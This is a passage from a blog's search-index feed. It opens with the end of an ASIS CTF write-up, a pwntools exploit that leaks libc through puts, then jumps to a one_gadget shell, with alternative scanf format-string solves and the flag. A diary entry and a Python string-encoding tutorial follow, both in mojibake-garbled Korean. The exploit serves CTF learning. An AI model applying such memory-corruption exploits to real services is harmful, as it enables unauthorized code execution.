class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(libc_base + <span class="number">0xe3b01</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Another-Solve"><a href="#Another-Solve" class="headerlink" title="Another Solve"></a>Another Solve</h2><h3 id="1-Using-FSB"><a href="#1-Using-FSB" class="headerlink" title="1. Using FSB"></a>1. Using FSB</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">b&#x27;1$999&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffe3b4d0ac8 â†’ 0x73393939243125 (&quot;%1$999s&quot;?),</span><br><span class="line">   $rsi = 0x007ffe3b4d0ab0 â†’ 0x0000000000000005,</span><br><span class="line">   $rdx = 0x007ffe3b4d0ab0 â†’ 0x0000000000000005</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Maybe.. I think this solution is intention.</p><h3 id="2-Using-rsi-x3D-x3D-rdx"><a href="#2-Using-rsi-x3D-x3D-rdx" class="headerlink" title="2. Using rsi &#x3D;&#x3D; rdx"></a>2. Using rsi &#x3D;&#x3D; rdx</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">b&#x27;1s%&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> </span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffe99d75878 â†’ 0x00007325733125 (&quot;%1s%s&quot;?),</span><br><span class="line">   $rsi = 0x007ffe99d75860 â†’ 0x0000000000000005,</span><br><span class="line">   $rdx = 0x007ffe99d75860 â†’ 0x0000000000000005</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASIS&#123;06e5ff13b438f5d6626a97758fddde3e502fe3fc&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> ASIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-10-14 Diary</title>
      <link href="/221014-diary/"/>
      <url>/221014-diary/</url>
      
        <content type="html"><![CDATA[<h2 id="ë¸”ë¡œê·¸-ê´€ë ¨"><a href="#ë¸”ë¡œê·¸-ê´€ë ¨" class="headerlink" title="ë¸”ë¡œê·¸ ê´€ë ¨"></a>ë¸”ë¡œê·¸ ê´€ë ¨</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>ëŒ“ê¸€ ê¸°ëŠ¥ì„ ì¶”ê°€í–ˆë‹¤. </p><p>ì „ì— ìž ê¹ ìš´ì˜í–ˆë˜ ë¸”ë¡œê·¸ëŠ” utterancesì„ ì‚¬ìš©í–ˆì—ˆë‹¤. Githubì˜ issueë¡œ ëŒ“ê¸€ì„ ê´€ë¦¬í•  ìˆ˜ ìžˆë‹¤ëŠ” ì ì´ ë§¤ë ¥ì ì´ì—ˆì§€ë§Œ Github ê³„ì •ì´ ìžˆì–´ì•¼ë§Œ ëŒ“ê¸€ì„ ë“±ë¡í•  ìˆ˜ ìžˆë‹¤ëŠ” ì ì´ ë§ˆìŒì— ë“¤ì§€ ì•Šì•˜ë‹¤. ê·¸ëž˜ë„ ë§ˆí¬ë‹¤ìš´ë„ ì§€ì›í•˜ê³  ë‚˜ë¦„ uië„ ì˜ˆë»ì„œ ê³„ì† ì‚¬ìš©í•˜ê³  ì‹¶ì—ˆìœ¼ë‚˜ ë‚´ê°€ ì›í•˜ëŠ” ê¸°ëŠ¥ì´ êµ¬í˜„ë˜ì–´ ìžˆì§€ ì•Šì•˜ë‹¤. ë°”ë¡œ reaction ê¸°ëŠ¥ì¸ë°, tistoryì— í•˜íŠ¸ë¡œ ê³µê° ëˆ„ë¥´ëŠ”.. ê·¸ëŸ° ê¸°ëŠ¥ì„ ì›í–ˆì§€ë§Œ utterancesì—ëŠ” ê·¸ëŸ° ê¸°ëŠ¥ì´ ì—†ì—ˆë‹¤. hexo pluginì„ ì°¾ì•„ë´¤ì§€ë§Œ ì°¾ì•„ë³´ê¸°ê°€ íž˜ë“¤ì—ˆë‹¤. ê·¸ëŸ¬ë‹¤ê°€ giscusë¼ëŠ” ê²ƒì„ ë°œê²¬í–ˆë‹¤.</p><p>giscusëŠ” utterancesì™€ ë§¤ìš° ìœ ì‚¬í•˜ë‹¤. utterancesì—ì„œ ëŒ€ëŒ“ê¸€ ê¸°ëŠ¥ì„ ì¶”ê°€í–ˆë‹¤. ë˜í•œ ë‚´ê°€ ì›í•˜ëŠ” reaction ê¸°ëŠ¥ì´ ìžˆì—ˆë‹¤! ê·¸ëž˜ì„œ ë°”ë¡œ giscusë¥¼ ì ìš©í•˜ë ¤ê³  í–ˆìœ¼ë‚˜ ìµëª…ì¸ ìƒíƒœì—ì„  ëŒ“ê¸€ê³¼ reactionì„ í•  ìˆ˜ ì—†ë‹¤ëŠ” ê²ƒì´ ì€ê·¼ ê±°ìŠ¬ë ¸ë‹¤. </p><p>ê·¸ëž˜ì„œ ê²°êµ­ disqusë¥¼ ì´ìš©í•˜ê¸°ë¡œ í–ˆë‹¤. ê´‘ê³ ê°€ ë¶™ëŠ”ë‹¤ëŠ” ì‚¬ì‹¤ë•Œë¬¸ì— ì‚¬ìš©í•˜ê¸° êº¼ë ¤ì¡Œì—ˆëŠ”ë°, ìž ê¹ ì„œì¹˜í•´ë³¸ ê²°ê³¼ ê´‘ê³ ëŠ” ì¼ì¼ ì¡°íšŒìˆ˜ì— ì˜í–¥ì„ ë°›ëŠ” ê²ƒ ê°™ì•˜ë‹¤. ì •í™•í•œ ìˆ˜ì¹˜ëŠ” ê¸°ì–µì´ ë‚˜ì§€ ì•Šì§€ë§Œ ì´ì •ë„ë©´ ê´‘ê³  ë¶™ì„ ê±±ì •ì„ í•˜ì§€ ì•Šì•„ë„ ë  ê²ƒ ê°™ë‹¤ê³  íŒë‹¨í–ˆë‹¤. ã…‹ã…‹ </p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>Search íƒ­ì„ ì¶”ê°€í–ˆë‹¤. ì •ì ìœ¼ë¡œ íƒìƒ‰í•´ì„œ ì†ë„ê°€ ì§±ì§± ë¹ ë¥´ë‹¤. ë§¤ìš° ë§ˆìŒì— ë“ ë‹¤. ë‚´ê°€ ìžì£¼ ì“¸ ê²ƒ ê°™ë‹¤.</p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>Sitemap ë“±ë¡ì„ í–ˆë‹¤. ì „ì— ìž ê¹ ìš´ì˜í–ˆë˜ ë¸”ë¡œê·¸ì—ë„ Sitemap ë“±ë¡ì„ í–ˆì—ˆëŠ”ë° ê·¸ í”ì ì´ ì•„ì§ ë‚¨ì•„ìžˆë‹¤ T.T ì‚­ì œí•˜ê³  ìž¬ë“±ë¡ì„ í–ˆìŒì—ë„.. í‘í‘<br>ìƒ‰ì¸ì´ ì œëŒ€ë¡œ ìƒì„±ë˜ì§€ ì•Šì•„ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìš”ì²­í–ˆë‹¤. ì˜¤ëž˜ ê±¸ë¦´ ìˆ˜ë„ ìžˆë‹¤ê³  í•œë‹¤. </p>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to Deal With Strings in Python</title>
      <link href="/221013-python3-String/"/>
      <url>/221013-python3-String/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>Pythonì—ì„œì„œì˜ ë¬¸ìžì—´ ì¸ì½”ë”© ë°©ì‹ì„ ì„¤ëª…í•˜ê¸° ìœ„í•´ <code>ASCII</code>ì™€ <code>Unicode</code>ì— ëŒ€í•´ ê°„ë‹¨ížˆ ì„¤ëª…í•œë‹¤. Python2ì—ì„œëŠ” ë””í´íŠ¸ ì¸ì½”ë”© ë°©ì‹ì´ <code>ASCII</code>ì´ì§€ë§Œ Python3ì—ì„œëŠ” <code>UTF-8</code>ì„ ì±„íƒí–ˆë‹¤. <code>UTF-8</code>ì€ <code>Unicode</code> ì¸ì½”ë”© ë°©ì‹ ì¤‘ í•˜ë‚˜ë¡œ ì „ì„¸ê³„ì—ì„œ ë„ë¦¬ ì“°ì´ëŠ” ì¸ì½”ë”© ë°©ì‹ì´ë‹¤.</p><p>Python2ì™€ Python3ì—ì„œ ë¬¸ìžì—´ì„ ë‹¤ë£¨ëŠ” ë°©ì‹ì´ ë°”ë€Œì—ˆìœ¼ë¯€ë¡œ, payloadë¥¼ ìž‘ì„±í•  ë•Œ Python2ì— ìµìˆ™í•œ playerê°€ Python3ë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” Unicodeë¡œ ì¸ì½”ë”©í•œ byte ë¬¸ìžì—´ê³¼ ì¼ë°˜ ë¬¸ìžì—´ì˜ ì°¨ì´ë¥¼ ì•Œê³  ìžˆì–´ì•¼ í•œë‹¤.</p><h2 id="ASCIIì™€-Unicode"><a href="#ASCIIì™€-Unicode" class="headerlink" title="ASCIIì™€ Unicode"></a>ASCIIì™€ Unicode</h2><p><code>ASCII</code>ì™€ <code>Unicode</code>ì— ëŒ€í•´ ê°„ë‹¨ížˆ ì•Œì•„ë³´ìž.</p><h3 id="ì•„ìŠ¤í‚¤-ASCII-American-Standard-Code-for-Information-Interchange"><a href="#ì•„ìŠ¤í‚¤-ASCII-American-Standard-Code-for-Information-Interchange" class="headerlink" title="ì•„ìŠ¤í‚¤ (ASCII, American Standard Code for Information Interchange)"></a>ì•„ìŠ¤í‚¤ (ASCII, American Standard Code for Information Interchange)</h3><ul><li>1960ë…„ëŒ€ ë¯¸êµ­ì—ì„œ ì •ì˜í•œ í‘œì¤€í™”í•œ ë¶€í˜¸ì²´ê³„</li></ul><p><code>ASCII ì½”ë“œ</code>ëŠ” 7bit ì¦‰, 128(&#x3D;2^7)ê°œì˜ ê³ ìœ í•œ ê°’ë§Œ ì‚¬ìš©í•œë‹¤. ì»´í“¨í„°ì˜ ê¸°ë³¸ ì €ìž¥ ë‹¨ìœ„ëŠ” 1byte(&#x3D;8bits)ì¸ë°, <code>ASCII ì½”ë“œ</code>ëŠ” 7bitë§Œ ì‚¬ìš©í•œë‹¤. ë‚˜ë¨¸ì§€ 1bitëŠ” Parity Bitì¸ë°, ì´ëŠ” í†µì‹  ì—ëŸ¬ ê²€ì¶œì„ ì˜ë¯¸í•œë‹¤.</p><p>10ì§„ìˆ˜ë¡œ 0ë¶€í„° 127, 16ì§„ìˆ˜ë¡œ 0x00ë¶€í„° 0x7Fì˜ ë²”ìœ„ë¡œ ë¬¸ìžì—´ Char ì¦‰, ê³ ìœ ê°’ì„ í‘œí˜„í•  ìˆ˜ ìžˆë‹¤.</p><p>7bitë¡œ í‘œí˜„í•  ìˆ˜ ìžˆëŠ” <code>ASCII ì½”ë“œ</code>ëŠ” â€˜ì˜ë¬¸â€™ë§Œì„ í‘œí˜„í•  ìˆ˜ ìžˆë‹¤. ë‹¤ë¥¸ ì–¸ì–´ë¥¼ í‘œí˜„í•˜ê¸°ì—ëŠ” 7bitë¡œëŠ” ì—­ë¶€ì¡±ì´ì—ˆë‹¤. ê·¸ëž˜ì„œ 8bitsë¡œ í™•ìž¥í•œ ì•„ìŠ¤í‚¤ ì½”ë“œê°€ ë“±ìž¥í–ˆëŠ”ë°, ì´ë¥¼ <code>ANSI ì½”ë“œ</code>ë¼ê³  ë¶€ë¥´ê¸°ë¡œ í–ˆë‹¤ë”ë¼.</p><p><code>ANSI ì½”ë“œ</code>ëŠ” 8bitsë¡œ í‘œí˜„í•  ìˆ˜ ìžˆìœ¼ë‹ˆ 256(&#x3D;2^8)ê°œì˜ ê°’ì„ ì“¸ ìˆ˜ ìžˆëŠ”ë°, ì—¬ì „ížˆ â€˜í•œê¸€â€™ì„ í¬í•¨í•œ ë¹„ìœ ëŸ½ êµ­ê°€ì˜ ë¬¸ìžë¥¼ í‘œí˜„í•˜ê¸°ì—ëŠ” ì—­ë¶€ì¡±ì´ì—ˆë‹¤. ê·¸ëž˜ì„œ <code>ìœ ë‹ˆì½”ë“œ (Unicode)</code>ë¼ëŠ” ì „ ì„¸ê³„ ì–¸ì–´ì˜ ë¬¸ìžë¥¼ ì •ì˜í•˜ê¸° ìœ„í•œ êµ­ì œ í‘œì¤€ ì½”ë“œê°€ ë“±ìž¥í–ˆë‹¤.</p><h3 id="ìœ ë‹ˆì½”ë“œ-Unicode"><a href="#ìœ ë‹ˆì½”ë“œ-Unicode" class="headerlink" title="ìœ ë‹ˆì½”ë“œ (Unicode)"></a>ìœ ë‹ˆì½”ë“œ (Unicode)</h3><p><code>ìœ ë‹ˆì½”ë“œ</code>ëŠ” <code>ASCII ì½”ë“œ</code>ë‚˜ <code>ANSI ì½”ë“œ</code>ë³´ë‹¤ í›¨ì”¬ í¬ê²Œ ìš©ëŸ‰ì„ 2byte(&#x3D;2^16, 65536)ë¡œ í™•ìž¥í•œ ì½”ë“œì´ë‹¤. ë¬´ë ¤ 65536(&#x3D;2^16)ê°œë‚˜ ë¬¸ìžë¥¼ ì €ìž¥í•  ìˆ˜ ìžˆì—ˆë‹¤. ì°¸ê³ ë¡œ <code>ìœ ë‹ˆì½”ë“œ 3.0ë²„ì „</code>ê¹Œì§€ëŠ” ì´ë¥¼ <code>ê¸°ë³¸ ì–¸ì–´íŒ (BMP, Basic Multilingual Plane)</code>ì´ë¼ê³  ë¶ˆë €ë‹¤. ë¹„íŠ¸ë§µì´ ì•„ë‹ˆë‹¤.</p><p>0x0000ë¶€í„° 0xFFFFê¹Œì§€ í‘œí˜„ì´ ê°€ëŠ¥í•˜ë‹¤.</p><p>í•˜ì§€ë§Œ ì´ëŠ” ë˜ ì„¸ìƒì˜ ëª¨ë“  ì–¸ì–´ë¥¼ ê°ë‹¹í•˜ê¸°ê°€ íž˜ë“¤ì—ˆë‹¤. ê·¸ëž˜ì„œ <code>ìœ ë‹ˆì½”ë“œ 3.0ë²„ì „</code>ë¶€í„° <code>ë³´ì¶© ì–¸ì–´íŒ (Supplementary Plane)</code>ì„ ì •ì˜í–ˆë‹¤. ì´ë•Œ í•œìžê°€ ê°€ìž¥ ë§Žì´ í• ë‹¹ë°›ì•˜ë‹¤ê³  í•œë‹¤. ê·¸ëŸ°ë° ì´ê²ƒì€ bitë¡œ ì–´ë–»ê²Œ í‘œí˜„í•  ìˆ˜ ìžˆì„ê¹Œ?</p><p>ì‚¬ì‹¤ <code>ê¸°ë³¸ ì–¸ì–´íŒ</code>ì—ëŠ” ëŒ€í–‰ì½”ë“œ ì˜ì—­ì´ëž€ ê²ƒì´ ì¡´ìž¬í•œë‹¤. ìƒìœ„ ëŒ€í–‰ì½”ë“œì™€ í•˜ìœ„ ëŒ€í–‰ì½”ë“œë¥¼ ì¡°í•©í•´ì„œ <code>ë³´ì¶© ì–¸ì–´íŒ</code>ì˜ ë¬¸ìžë¥¼ í‘œí˜„í•œë‹¤. ì¦‰, 2byteê°€ ê¼­ í•œ ê°œì˜ ë¬¸ìžë¥¼ ì˜ë¯¸í•˜ëŠ” ê²ƒì€ ì•„ë‹ˆë‹¤. í•œê°œë¥¼ ì½ì–´ë³´ê³  ëŒ€í–‰ì½”ë“œì´ë©´ ê·¸ ë‹¤ìŒ í•œê°œë¥¼ ë” ì½ì–´ í•œ ë¬¸ìžë¥¼ ì™„ì„±í•œë‹¤. </p><p><code>ê¸°ë³¸ ì–¸ì–´íŒ</code>ì˜ ëŒ€í–‰ì½”ë“œ ì˜ì—­ì€ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ìƒìœ„ ëŒ€í–‰ì½”ë“œ (High Surrogates) : D800 - DBFF</span><br><span class="line">í•˜ìœ„ ëŒ€í–‰ì½”ë“œ (Low Surrogates) : DC00 - DFFF</span><br></pre></td></tr></table></figure><p>ì •ë¦¬í•˜ìžë©´ <code>ìœ ë‹ˆì½”ë“œëŠ” 2byteë¡œë§Œ í‘œí˜„í•  ìˆ˜ ìžˆë‹¤.</code>ëŠ” ì™„ì „ížˆ í‹€ë¦° ì†Œë¦¬ì´ë‹¤. ê²°êµ­ <code>ìœ ë‹ˆì½”ë“œ</code>ëŠ” ëª¨ë“  ë¬¸ìžì— index(Unidocde code point, ê³ ìœ í•œ ê°’)ë¥¼ ë¶€ì—¬í•œ ê²ƒì´ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27;ë¼ëŠ” ê¸€ìžëŠ” 0x0041(U+0041)ì´ë¼ëŠ” indexë¥¼ ê°€ì§„ë‹¤.</span><br><span class="line">&#x27;a&#x27;ë¼ëŠ” ê¸€ìžëŠ” 0x0061(U+0061)ì´ë¼ëŠ” indexë¥¼ ê°€ì§„ë‹¤.</span><br><span class="line">&#x27;ê°€&#x27;ë¼ëŠ” ê¸€ìžëŠ” 0xAC00(U+AC00)ì´ë¼ëŠ” indexë¥¼ ê°€ì§„ë‹¤.</span><br></pre></td></tr></table></figure><p>ì°¸ê³ ë¡œ <code>U+</code>ë¼ëŠ” ì ‘ë‘ì–´ê°€ ë¶™ì–´ìžˆìœ¼ë©´ <code>ìœ ë‹ˆì½”ë“œ</code>ë¼ëŠ” ì˜ë¯¸ì´ë‹¤. <code>U+0000 ~ U+007F</code>ë¡œ <code>ASCII</code> ë¬¸ìžë¥¼ ëª¨ë‘ í‘œí˜„í•  ìˆ˜ ìžˆë‹¤. ì°¸ê³ ë¡œ <code>U+AC00 ~ U+D7AF</code>ë¡œ í•œê¸€ ìŒì ˆì„ í‘œí˜„í•  ìˆ˜ ìžˆë‹¤.</p><h2 id="ìœ ë‹ˆì½”ë“œë¥¼-í‘œí˜„í•˜ëŠ”-ë°©ë²•"><a href="#ìœ ë‹ˆì½”ë“œë¥¼-í‘œí˜„í•˜ëŠ”-ë°©ë²•" class="headerlink" title="ìœ ë‹ˆì½”ë“œë¥¼ í‘œí˜„í•˜ëŠ” ë°©ë²•"></a>ìœ ë‹ˆì½”ë“œë¥¼ í‘œí˜„í•˜ëŠ” ë°©ë²•</h2><p><code>ìœ ë‹ˆì½”ë“œ</code>ì˜ indexë¥¼ í‘œí˜„í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì•Œì•„ë³´ìž. ì´ëŸ¬í•œ indexëŠ” ì—¬ëŸ¬ í˜•ì‹ìœ¼ë¡œ ë³€í™˜ë  ìˆ˜ ìžˆëŠ”ë°, ê·¸ ì¤‘ ê°œì¸ì ìœ¼ë¡œ ê°€ìž¥ ìµìˆ™í•œ <code>UTF-8</code> ì¸ì½”ë”©ì„ ì•Œì•„ë´¤ë‹¤. </p><p>ê·¸ ì „ì— ê¶ê¸ˆì¦ì´ ìžˆë‹¤. indexë¥¼ ë°”ë¡œ ì»´í“¨í„°ì— ì €ìž¥í•˜ë©´ ì•ˆë˜ëŠ” ê±¸ê¹Œ? ì™œ ì»´í“¨í„°ì— ì €ìž¥í•˜ê¸° ìœ„í•´ì„œ ë˜ ë³€í™˜ì„ í•´ì•¼í• ê¹Œ? ìš©ëŸ‰ë•Œë¬¸ì´ë‹¤. ì˜ˆë¥¼ ë“¤ì–´, 1byteë¡œ ì¶©ë¶„ížˆ í‘œí˜„í•  ìˆ˜ ìžˆëŠ” Aë¥¼ êµ³ì´ 2byteë¡œ ì €ìž¥í•œë‹¤ë©´ ìš©ëŸ‰ ë¬¸ì œê°€ ìƒê¸¸ ê²ƒì´ë‹¤. í˜¸í™˜ì´ ìž˜ë˜ê³  ìš©ëŸ‰ì„ ì ê²Œ ë§Œë“¤ê¸° ìœ„í•´ ìœ ë‹ˆì½”ë“œì˜ index(ìˆ«ìž)ë¥¼ ì»´í“¨í„°ì— íš¨ê³¼ì ìœ¼ë¡œ í• ë‹¹í•´ì„œ 0ê³¼ 1ë¡œ í‘œí˜„í•  ì§€ ê²°ì •í•˜ëŠ” <code>ì¸ì½”ë”© ë°©ì‹</code>ì´ í•„ìš”í•˜ë‹¤. </p><h3 id="UTF-8-ê°€ë³€ê¸¸ì´-ì¸ì½”ë”©-Unicode-Transformation-Format"><a href="#UTF-8-ê°€ë³€ê¸¸ì´-ì¸ì½”ë”©-Unicode-Transformation-Format" class="headerlink" title="UTF-8 (ê°€ë³€ê¸¸ì´ ì¸ì½”ë”©, Unicode Transformation Format)"></a>UTF-8 (ê°€ë³€ê¸¸ì´ ì¸ì½”ë”©, Unicode Transformation Format)</h3><p><code>ìœ ë‹ˆì½”ë“œ</code>ê°€ ì¸í„°íŽ˜ì´ìŠ¤ë¼ë©´ <code>UTF-8</code>ì€ êµ¬í˜„ì²´ë¼ê³  í•  ìˆ˜ ìžˆë‹¤. <code>UTF-8</code>ì€ 8bit ë¬¸ìž ì¸ì½”ë”© í˜•ì‹ìœ¼ë¡œ <code>ìœ ë‹ˆì½”ë“œ</code> ë¬¸ìžë¥¼ indexì— ë”°ë¼ 8bit(&#x3D;1byte) ~ 4byteë¡œ ë³€í™˜í•œë‹¤. </p><p><code>UTF-8</code>ì€ ê°€ë³€ë°”ì´íŠ¸ë¥¼ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì—, 1byteë¡œ í‘œí˜„ì´ ì¶©ë¶„í•œ AëŠ” 0x41ë¡œ í‘œí˜„í•œë‹¤. ì´ëŠ” <code>UTF-8</code>ê³¼ <code>ASCII ì½”ë“œ</code>ì™€ ì˜ë¬¸ ì˜ì—­ì—ì„œëŠ” 100% í˜¸í™˜ëœë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤. </p><h4 id="Code-point-â†”-UTF-8-conversion"><a href="#Code-point-â†”-UTF-8-conversion" class="headerlink" title="Code point â†” UTF-8 conversion"></a>Code point â†” UTF-8 conversion</h4><table><thead><tr><th align="right">First code point</th><th align="right">Last code point</th><th>Byte 1</th><th>Byte 2</th><th>Byte 3</th><th>Byte 4</th></tr></thead><tbody><tr><td align="right">U+0000</td><td align="right">U+007F</td><td>0xxxxxxx</td><td></td><td></td><td></td></tr><tr><td align="right">U+0080</td><td align="right">U+07FF</td><td>110xxxxx</td><td>10xxxxxx</td><td></td><td></td></tr><tr><td align="right">U+0800</td><td align="right">U+FFFF</td><td>1110xxxx</td><td>10xxxxxx</td><td>10xxxxxx</td><td></td></tr><tr><td align="right">U+10000</td><td align="right">U+10FFFF</td><td>11110xxx</td><td>10xxxxxx</td><td>10xxxxxx</td><td>10xxxxxx</td></tr></tbody></table><p>ì¶œì²˜: <a href="https://en.wikipedia.org/wiki/UTF-8">https://en.wikipedia.org/wiki/UTF-8</a></p><p>ìœ„ì™€ ê°™ì´ <code>ìœ ë‹ˆì½”ë“œ</code> ë²”ìœ„ì— ë”°ë¼ <code>UTF-8</code> ì¸ì½”ë”©ì˜ byte ê°œìˆ˜ê°€ ì •í•´ì§„ë‹¤. ì°¸ê³ ë¡œ í•œê¸€ì€ 3byteë¡œ í‘œí˜„ëœë‹¤.</p><h2 id="Pythonì—ì„œì„œì˜-ë¬¸ìžì—´-ì¸ì½”ë”©"><a href="#Pythonì—ì„œì„œì˜-ë¬¸ìžì—´-ì¸ì½”ë”©" class="headerlink" title="Pythonì—ì„œì„œì˜ ë¬¸ìžì—´ ì¸ì½”ë”©"></a>Pythonì—ì„œì„œì˜ ë¬¸ìžì—´ ì¸ì½”ë”©</h2><p>ì»´í“¨í„°ê°€ ì €ìž¥í•  ìˆ˜ ìœ ì¼í•œ ê²ƒì€ byteì´ë‹¤. ê·¸ëž˜ì„œ ì¸ì½”ë”© ì¦‰, byteë¡œ ë³€í™˜í•´ì•¼í•˜ëŠ” ê³¼ì •ì„ ê±°ì³ì•¼ í•œë‹¤. Pythonì—ì„œì˜ ë¬¸ìžì—´ ì¸ì½”ë”© ë°©ì‹ì„ ì•Œì•„ë³´ìž.</p><h3 id="Python2"><a href="#Python2" class="headerlink" title="Python2"></a>Python2</h3><p>Python2ì—ì„œëŠ” <code>ASCII</code>ê°€ ë””í´íŠ¸ ì¸ì½”ë”© ë°©ë²•ìœ¼ë¡œ ë˜ì–´ìžˆë‹¤. <code>ASCII</code>ë¡œëŠ” í•œê¸€ì„ í‘œí˜„í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, í•œê¸€ì„ í‘œí˜„í•˜ê¸° ìœ„í•´ì„œ ì•„ëž˜ì˜ ì½”ë“œë¥¼ ì½”ë“œ ë§¨ ìœ—ì¤„ì— ë”°ë¡œ ëª…ì‹œí•´ì•¼í•œë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure><h3 id="Python3"><a href="#Python3" class="headerlink" title="Python3"></a>Python3</h3><p>Python3ì—ì„œëŠ” <code>UTF-8</code>ì´ ë””í´íŠ¸ ì¸ì½”ë”© ë°©ë²•ì´ë‹¤. ê·¸ëž˜ì„œ ëª¨ë“  ë¬¸ìžì—´ì€ <code>ìœ ë‹ˆì½”ë“œ</code>ë¡œ ì²˜ë¦¬ëœë‹¤. <code>b&#39;&#39;</code>ëŠ” byteìž„ì„ ì˜ë¯¸í•œë‹¤. ë””í´íŠ¸ë¡œ <code>UTF-8</code>ë¡œ ì¸ì½”ë”©ë˜ì–´ byte ë¬¸ìžì—´ë¡œ í‘œí˜„í–ˆìœ¼ë¯€ë¡œ ì´ê²ƒì„ ë‹¤ì‹œ<code>.decode()</code>í•˜ë©´ <code>UTF-8</code>ë¡œ ë””ì½”ë”©í•˜ì—¬ ë¬¸ìžì—´ë¡œ í‘œí˜„í•  ìˆ˜ ìžˆë‹¤. </p><p>ì •ë¦¬í•˜ë©´ ì¸ì½”ë”© ë°©ì‹ë§Œ ì•Œë©´ byte ë¬¸ìžì—´ì„ ë‹¤ì‹œ ë¬¸ìžì—´ë¡œ ë””ì½”ë”©í•  ìˆ˜ ìžˆë‹¤ëŠ” ì˜ë¯¸ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b&#x27;jir4vvit&#x27;</span><br><span class="line">b&#x27;jir4vvit&#x27;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;bytes&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; 